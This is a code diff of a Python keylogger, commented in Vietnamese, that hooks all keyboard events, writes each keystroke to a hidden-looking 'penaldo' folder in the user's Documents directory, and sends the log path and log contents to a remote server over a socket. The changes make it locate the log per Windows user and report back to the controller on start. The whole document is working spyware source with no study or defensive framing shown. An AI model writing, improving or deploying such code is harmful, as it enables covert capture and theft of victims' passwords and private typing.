@@ -1,10 +1,21 @@
 import os
 import keyboard
 
-log_file = "keylog.txt"
-is_logging = False
+def get_username():
+    return os.getenv("USERNAME")
 
-def log_key(e):
+def get_log_file():
+    username = get_username()
+    log_directory = os.path.join("C:", "Users", username, "Documents", "penaldo")
+    log_file = os.path.join(log_directory, "keylog.txt")
+    return log_file, log_directory
+
+def ensure_log_directory_exists(log_directory):
+    """Kiểm tra và tạo thư mục chứa file log nếu chưa tồn tại."""
+    if not os.path.exists(log_directory):
+        os.makedirs(log_directory)
+
+def log_key(e, log_file, log_directory):
     """Ghi lại các phím bấm vào file log"""
     if e.event_type == keyboard.KEY_DOWN:
         if e.name == 'space':
@@ -16,27 +27,24 @@ def log_key(e):
         else:
             char = e.name
 
+        ensure_log_directory_exists(log_directory)
+
         with open(log_file, "a", encoding="utf-8") as f:
             f.write(char)
 
-def start_keylogger():
+def start_keylogger(sock):
     """Khởi động keylogger"""
-    global is_logging
-    if not is_logging:
-        is_logging = True
-        keyboard.hook(log_key)
-        print("Keylogger started.")
+    log_file, log_directory = get_log_file()
+    keyboard.hook(lambda e: log_key(e, log_file, log_directory))
+    sock.sendall(f"{log_file}\n".encode())
 
 def stop_keylogger():
     """Dừng keylogger"""
-    global is_logging
-    if is_logging:
-        keyboard.unhook_all()
-        is_logging = False
-        print("Keylogger stopped.")
+    keyboard.unhook_all()
 
 def send_log(sock):
     """Gửi nội dung file log tới server"""
+    log_file, _ = get_log_file()
     if os.path.exists(log_file):
         with open(log_file, 'rb') as f:
             while True:
@@ -50,6 +58,7 @@ def send_log(sock):
 
 def delete_log():
     """Xóa file log"""
+    log_file, _ = get_log_file()
     if os.path.exists(log_file):
         os.remove(log_file)
         print("Log file deleted.")
